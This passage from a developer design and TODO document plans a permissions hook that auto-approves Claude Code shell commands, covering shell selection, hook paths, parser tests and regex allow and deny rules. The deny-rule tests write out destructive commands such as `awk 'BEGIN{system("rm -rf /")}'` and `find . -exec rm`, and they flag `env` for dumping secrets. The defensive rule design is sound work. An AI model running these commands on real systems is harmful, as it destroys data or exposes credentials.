2. **CLAUDE.md**
   - Project overview description

3. **src/bashly.yml**
   - `help:` text for main command

4. **Installer output**
   - Banner text
   - Step descriptions

### Suggested copy changes

**Before:**
```
Fixes and enhancements for Claude Code CLI.
```

**After:**
```
Enhancements for Claude Code CLI - smarter permissions and shell handling.
```

**Before:**
```
## What This Fixes
### 1. Piped Commands Not Auto-Approved (Issue #13340)
**Problem:** Claude Code's permission system...
```

**After:**
```
## Features
### 1. Smart Piped Command Handling
Claude Code's default permission system uses simple prefix matching...
Better Claude Code adds intelligent parsing that understands shell syntax.
```

### Tone shift

| Before | After |
|--------|-------|
| "Bug" | "Limitation" or "default behavior" |
| "Fix" | "Enhancement" or "improvement" |
| "Problem" | "How it works by default" |
| "Solution" | "What we add" |

### Keep issue references

Still link to the GitHub issues for context, but frame them as feature requests rather than bugs:
```
See [#13340](link) for the original feature request.
```

---

## 16. Remove --hook-prefix flag after dotfiles manager support

**Current:** `--hook-prefix` / `-p` flag exists to support chezmoi's `executable_` prefix requirement.

**Problem:** This flag is a workaround for a specific dotfiles manager quirk. Once we implement proper `--dotfiles-manager chezmoi` support (TODO #12), the prefix should be handled automatically.

**Action:** After implementing #12, remove:

1. **src/bashly.yml** - Remove the flag definition:
   ```yaml
   # Remove this:
   - long: --hook-prefix
     short: -p
     arg: prefix
     help: "Prefix for hook filename (e.g., 'executable_' for chezmoi)"
   ```

2. **src/lib/settings.sh** - Remove `HOOK_FILE_PREFIX` variable and related logic

3. **Tests** - Update tests that use `-p` flag

4. **README.md** - Remove documentation for the flag

5. **CLAUDE.md** - Update project documentation

**Dependency:** Must complete #12 (dotfiles manager support) first.

**Migration:** The `--dotfiles-manager chezmoi` flag will automatically:
- Detect chezmoi source path
- Use `executable_` prefix for hook files
- Use `dot_` prefix for config files

---

## 17. Default shell to bash instead of $SHELL

**Current:** Shell defaults to `$SHELL` (user's login shell).

**Problem:** Claude Code often generates bash-specific syntax even when running under zsh or fish. Setting `SHELL` to the user's actual shell can cause issues because Claude's generated commands may not be compatible.

**Recommendation:** Default to bash (specifically Homebrew's modern bash) since:
1. Claude Code generates bash-compatible commands
2. We require bash 4.4+ for the hook anyway
3. Users can still override with `--shell` if needed

### Changes

**src/bashly.yml:**
```yaml
# Before
help: "Path to shell (default: auto-detect from $SHELL)"

# After
help: "Path to shell (default: bash)"
```

**src/shell_command.sh:**
```bash
# Before
local shell_path="${args['--shell']:-$SHELL}"

# After
local shell_path="${args['--shell']:-$(find_modern_bash)}"
# Or fallback chain: Homebrew bash -> /bin/bash -> $SHELL
```

**Installer flow (TODO #13):**
```
Select shell for Claude Code to use:

  1) bash (recommended) - Best compatibility with Claude's commands
  2) zsh - macOS default
  3) fish
  4) Use my current shell ($SHELL)
  5) Other - specify path

Choice [1]:
```

### Rationale for users

Explain in the prompt:
```
Note: Claude Code typically generates bash-compatible commands.
Using bash ensures the best compatibility, regardless of your
personal shell preference for interactive use.
```

### Support shell name OR path

The `--shell` flag should accept either:
- Full path: `--shell /opt/homebrew/bin/bash`
- Just the name: `--shell bash`, `--shell zsh`, `--shell fish`

**Implementation:**

```bash
resolve_shell_path() {
  local input="$1"

  # If it's already an absolute path, use it
  if [[ "$input" == /* ]]; then
    echo "$input"
    return
  fi

  # Special handling for common shells
  case "$input" in
    bash)
      # Prefer modern bash
      find_modern_bash || which bash
      ;;
    *)
      # Try to find it
      which "$input" 2>/dev/null || {
        error "Shell '$input' not found"
        return 1
      }
      ;;
  esac
}

# Usage:
# --shell bash       → /opt/homebrew/bin/bash (or best available)
# --shell zsh        → /bin/zsh
# --shell fish       → /opt/homebrew/bin/fish
# --shell /bin/zsh   → /bin/zsh (used as-is)
```

### Interactive shell picker

```
Select shell for Claude Code:

  1) bash (recommended)
  2) zsh
  3) fish
  4) Other (enter name or path)

Choice [1]: 4

Enter shell name or path: nushell
Found: /opt/homebrew/bin/nu

Use /opt/homebrew/bin/nu? [Y/n]: Y
```

**Validation:**
```bash
validate_shell() {
  local shell_path="$1"

  if [[ ! -x "$shell_path" ]]; then
    error "Shell not found or not executable: $shell_path"
    return 1
  fi

  # Optionally verify it's actually a shell (has --version or similar)
  if ! "$shell_path" --version &>/dev/null && \
     ! "$shell_path" -c 'echo ok' &>/dev/null; then
    warn "Could not verify '$shell_path' is a valid shell"
  fi
}
```

---

## 18. Use relative hook path in settings.json

**Current:** Hook path is hardcoded with `$HOME`:
```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "$HOME/.claude/hooks/auto-approve-allowed-commands.sh"
      }]
    }]
  }
}
```

**Goal:** Use relative path if possible:
```json
"command": "~/.claude/hooks/auto-approve-allowed-commands.sh"
// or
"command": ".claude/hooks/auto-approve-allowed-commands.sh"
```

**Questions to test:**
1. Does Claude Code expand `~` in the command path?
2. Does Claude Code expand `$HOME`?
3. Does it support relative paths from the settings.json location?
4. What's the working directory when hooks are executed?

**Test plan:**
```bash
# Test 1: Tilde expansion
"command": "~/.claude/hooks/auto-approve-allowed-commands.sh"

# Test 2: Relative to settings.json
"command": "./hooks/auto-approve-allowed-commands.sh"

# Test 3: Relative to home
"command": ".claude/hooks/auto-approve-allowed-commands.sh"
```

**File:** `src/all_command.sh` - `configure_hook_in_settings()`

---

## 19. Test commands with colons

**Goal:** Ensure the parser correctly handles commands containing colons, which are common in:
- Docker volume mounts: `-v "$PWD:/app"`
- Port mappings: `-p 8080:80`
- Path specifications

**Test cases:**
```bash
# Docker with volume mount
"docker run --rm -v \"$PWD:/app\" dannyben/bashly generate"
# Should parse as: docker

# Docker with port mapping
"docker run -p 8080:80 nginx"
# Should parse as: docker

# Multiple colons
"docker run -v /host:/container -p 3000:3000 image:tag"
# Should parse as: docker

# Colons in environment variables
"FOO=bar:baz command"
# Should parse as: command (with FOO env var)

# Time-based commands
"at 10:30 echo hello"
# Should parse as: at
```

**Why this matters:** Colons appear in the permission format `Bash(command:*)`, so we need to ensure:
1. The parser doesn't confuse volume mount colons with permission colons
2. Commands with colons in arguments are correctly extracted
3. shfmt handles these cases properly (it should, but we need tests)

**Add to test/security/parsing.bats:**
```bash
@test "parsing: docker with volume mount" {
  run check_command 'docker run --rm -v "$PWD:/app" image'
  # Should extract: docker
}

@test "parsing: docker with port mapping" {
  run check_command 'docker run -p 8080:80 nginx'
  # Should extract: docker
}

@test "parsing: multiple colons in args" {
  run check_command 'docker run -v /a:/b -p 1:2 img:tag'
  # Should extract: docker
}
```

---

## 20. Regex-based allowlist for conditional command approval

**Goal:** Allow commands that are "mostly safe" but have dangerous flags/options, using regex to exclude the dangerous cases.

### Problem

Many useful commands have dual-use potential:
- `find` is safe... unless it has `-exec` (runs arbitrary commands)
- `brew` info/search is safe... unless it's `brew install` (installs packages)
- `awk` is safe for text processing... unless it uses `system()` calls
- `env` / `printenv` leak ALL environment variables including secrets

Claude Code's built-in permissions only support prefix matching with `:*`, which can't express "allow X except when Y".

### Proposed solution

Add a new `allowRegex` field in settings.json that accepts regex patterns:

```json
{
  "permissions": {
    "allow": [
      "Bash(git status:*)",
      "Bash(ls:*)"
    ],
    "allowRegex": [
      "Bash(find (?!.*-exec)(?!.*-execdir).*)",
      "Bash(brew (info|search|list|deps|cat|desc|home|leaves|outdated|doctor|config):*)",
      "Bash(awk (?!.*system\\s*\\().*)",
      "Bash(sed (?!.*-i).*)",
      "Bash(env (?!.*=)\\s*\\w+)",
      "Bash(fzf (?!.*--preview).*)"
    ],
    "deny": []
  }
}
```

### High-risk commands to support

| Command | Risk Level | Dangerous Pattern | Safe Pattern |
|---------|------------|-------------------|--------------|
| `brew` | CRITICAL | `brew install`, `brew upgrade` | `brew info`, `brew search`, `brew list` |
| `awk` | CRITICAL | `system()` call | Normal text processing |
| `find` | CRITICAL | `-exec`, `-execdir` flags | `-name`, `-type`, `-print` |
| `fzf` | CRITICAL | `--preview` flag | Basic fuzzy finding |
| `env` | CRITICAL | No args (dumps all) | With specific var name |
| `printenv` | CRITICAL | No args (dumps all) | With specific var name |
| `sed` | HIGH | `-i` flag (in-place edit) | Print to stdout |
| `tee` | HIGH | Any use (writes to files) | Maybe with `-a` only? |
| `mkdir` | MEDIUM | `.ssh`, `.git/hooks` paths | Normal directories |
| `plutil` | HIGH | `-replace`, `-insert` flags | `-p` (print only) |
| `brew upgrade` | MEDIUM | Any use | N/A (always risky) |
| `pass ls` | HIGH | Any use (exposes structure) | N/A |
| `defaults read` | MEDIUM | Sensitive domains | Non-sensitive domains |
| `openssl s_client` | LOW | Any use (network) | Maybe specific hosts? |

### Implementation approach

#### Option A: Hook-based (recommended)

Extend the existing `auto-approve-allowed-commands.sh` hook:

```bash
# After checking standard prefix permissions, check regex permissions
check_regex_permissions() {
  local cmd="$1"
  local regex_perms

  # Read allowRegex from settings.json
  regex_perms=$(jq -r '.permissions.allowRegex // [] | .[]' "$SETTINGS_FILE")

  while IFS= read -r pattern; do
    # Extract the regex from Bash(...)
    local regex="${pattern#Bash(}"
    regex="${regex%)}"

    if [[ "$cmd" =~ $regex ]]; then
      return 0  # Allowed
    fi
  done <<< "$regex_perms"

  return 1  # Not matched
}
```

#### Option B: Separate deny-regex field

Instead of positive regex matching, use negative patterns:

```json
{
  "permissions": {
    "allow": [
      "Bash(find:*)",
      "Bash(brew:*)",
      "Bash(awk:*)"
    ],
    "denyRegex": [
      "Bash(find.*-exec.*)",
      "Bash(brew (install|upgrade|uninstall).*)",
      "Bash(awk.*system\\s*\\(.*)"
    ]
  }
}
```

**Precedence:** `denyRegex` > `allow` > default deny

### Regex patterns for each command

#### find (block -exec/-execdir)
```regex
^find\s+(?!.*\s-exec)(?!.*\s-execdir).*$
```

#### brew (allow only read-only subcommands)
```regex
^brew\s+(info|search|list|leaves|deps|desc|cat|home|outdated|doctor|config|--version|--prefix|--cellar|--caskroom|tap-info)(\s+.*)?$
```

#### awk (block system() calls)
```regex
^awk\s+'(?!.*system\s*\().*'(\s+.*)?$
```
Note: This is tricky because system() could be obfuscated. Consider blocking awk entirely.

#### sed (block -i flag)
```regex
^sed\s+(?!.*-i\b).*$
```

#### env/printenv (require specific variable name)
```regex
^(env|printenv)\s+[A-Z_][A-Z0-9_]*\s*$
```

#### fzf (block --preview)
```regex
^fzf\s+(?!.*--preview).*$
```

#### mkdir (block sensitive paths)
```regex
^mkdir\s+(?!.*\.ssh)(?!.*\.git/hooks)(?!.*\.gnupg).*$
```

#### plutil (allow only print mode)
```regex
^plutil\s+-p\s+.*$
```

### Test cases

```bash
# find
"find . -name '*.txt'"              # ALLOW
"find . -type f -print"             # ALLOW
"find . -exec rm {} \;"             # DENY
"find . -execdir cat {} \;"         # DENY
"find . -name foo -exec echo {} +"  # DENY

# brew
"brew info jq"                      # ALLOW
"brew search json"                  # ALLOW
"brew list"                         # ALLOW
"brew install malware"              # DENY
"brew upgrade"                      # DENY
"brew uninstall jq"                 # DENY

# awk
"awk '{print $1}' file.txt"         # ALLOW
"awk '/pattern/ {print}'"           # ALLOW
"awk 'BEGIN{system(\"rm -rf /\")}'" # DENY

# sed
"sed 's/foo/bar/g' file.txt"        # ALLOW
"sed -n '1,10p' file.txt"           # ALLOW
"sed -i 's/foo/bar/g' file.txt"     # DENY
"sed -i.bak 's/foo/bar/' file.txt"  # DENY

# env/printenv
"env HOME"                          # ALLOW
"printenv PATH"                     # ALLOW
"env"                               # DENY (dumps all)
"printenv"                          # DENY (dumps all)
"env | grep API"                    # DENY (dumps all, even with pipe)

# fzf
"fzf"                               # ALLOW
"fzf --height 40%"                  # ALLOW
"fzf --preview 'cat {}'"            # DENY
"fzf --preview='rm {}'"             # DENY

# mkdir
"mkdir foo"                         # ALLOW
"mkdir -p src/components"           # ALLOW
"mkdir .ssh"                        # DENY
"mkdir -p .git/hooks"               # DENY
"mkdir ~/.gnupg"                    # DENY
```

### Security considerations

1. **Regex complexity:** Complex regexes can be bypassed. Keep patterns simple and conservative.

2. **Shell expansion:** Commands are checked AFTER shell expansion, so `$VAR` is already resolved.

3. **Bypass via encoding:** Watch for:
   - Unicode lookalikes
   - Hex/octal escapes
   - Variable interpolation tricks

4. **Performance:** Regex matching on every command could slow things down. Consider:
   - Only apply regex if standard prefix matching fails
   - Cache compiled regex patterns
   - Limit number of regex rules

5. **Default to deny:** If regex matching fails or errors, deny the command.

### User documentation

Add to README:

```markdown
## Advanced: Regex-based Permissions

For commands that are safe in some forms but dangerous in others, you can use regex patterns:

\`\`\`json
{
  "permissions": {
    "allowRegex": [
      "Bash(find (?!.*-exec).*)",
      "Bash(sed (?!.*-i).*)"
    ]
  }
}
\`\`\`

This allows `find` and `sed` commands EXCEPT when they contain dangerous flags.

**Note:** Regex permissions are applied AFTER standard prefix matching. Use them sparingly
for commands that truly need conditional approval.
\`\`\`

### Implementation phases

**Phase 1:** Add `allowRegex` support to the hook script
**Phase 2:** Add default regex rules for common dual-use commands
**Phase 3:** Add installer option to enable/configure regex permissions
**Phase 4:** Documentation and examples

---

## 21. Allow custom installation to specify custom shell

**Current behavior:** The custom installation mode only allows enabling/disabling features (hook, shell config, permissions). The shell path is always determined by the `--shell` flag default (modern bash from Homebrew).

**Problem:** Users in custom mode may want to specify a different shell without using the CLI flag. The interactive flow should prompt for shell selection when shell configuration is enabled.

### Proposed flow

When user selects "Custom installation" and enables "Shell configuration":

```
Select features to install:
  [x] Auto-approve-allowed-commands hook
  [x] Shell configuration        ← User enables this
  [x] Safe command permissions

Press Enter to continue...

────────────────────────────────────────────

Shell Configuration

Select shell for Claude Code to use:

  1) bash (recommended) - Best compatibility with Claude's commands
  2) zsh - macOS default
  3) fish
  4) Other - specify name or path

Choice [1]: 4

Enter shell name or path: /usr/local/bin/nu
Found: /usr/local/bin/nu

Use /usr/local/bin/nu? [Y/n]: Y

✓ Shell configured to /usr/local/bin/nu
```

### Implementation

**src/root_command.sh:**

```bash
install_customized() {
  local features
  features=$(prompt_feature_selection)

  for feature in $features; do
    case "$feature" in
      hook) install_hook ;;
      shell)
        # NEW: Prompt for shell selection in custom mode
        local shell_path
        if [[ -z "${args['--shell']:-}" ]]; then
          shell_path=$(prompt_shell_selection)
        else
          shell_path="${args['--shell']}"
        fi
        configure_shell "$shell_path"
        ;;
      permissions) prompt_and_add_permissions ;;
    esac
  done
}

prompt_shell_selection() {
  echo ""
  echo "Select shell for Claude Code to use:"
  echo ""
  echo "  1) bash (recommended)"
  echo "  2) zsh"
  echo "  3) fish"
  echo "  4) Other - specify name or path"
  echo ""

  local choice
  read -p "Choice [1]: " choice
  choice="${choice:-1}"

  case "$choice" in
    1) find_modern_bash ;;
    2) echo "/bin/zsh" ;;
    3) find_fish_path ;;
    4) prompt_custom_shell_path ;;
    *) find_modern_bash ;;  # Default to bash
  esac
}

prompt_custom_shell_path() {
  local input
  read -p "Enter shell name or path: " input

  local resolved
  resolved=$(resolve_shell_path "$input")

  if [[ -n "$resolved" ]]; then
    echo "Found: $resolved"
    local confirm
    read -p "Use $resolved? [Y/n]: " confirm
    if [[ ! "$confirm" =~ ^[Nn]$ ]]; then
      echo "$resolved"
      return
    fi
  fi

  # Fallback to bash if user cancels or shell not found
  find_modern_bash
}
```

### Relationship to other TODOs

- **TODO #13 (Redesign installer flow):** This is a subset of that work. The shell picker logic can be developed here and reused when the full flow redesign happens.
- **TODO #17 (Default shell to bash):** Already implemented. This TODO extends that by adding interactive selection in custom mode.

### Testing

```bash
# Test custom mode prompts for shell when shell config is enabled
CLAUDE_DIR_OVERRIDE=/tmp/test-claude ./install.sh
# Select "Custom installation"
# Enable "Shell configuration"
# Verify shell picker appears

# Test --shell flag still overrides in custom mode
CLAUDE_DIR_OVERRIDE=/tmp/test-claude ./install.sh --shell /bin/zsh
# Select "Custom installation"
# Enable "Shell configuration"
# Verify NO shell picker (flag takes precedence)
```
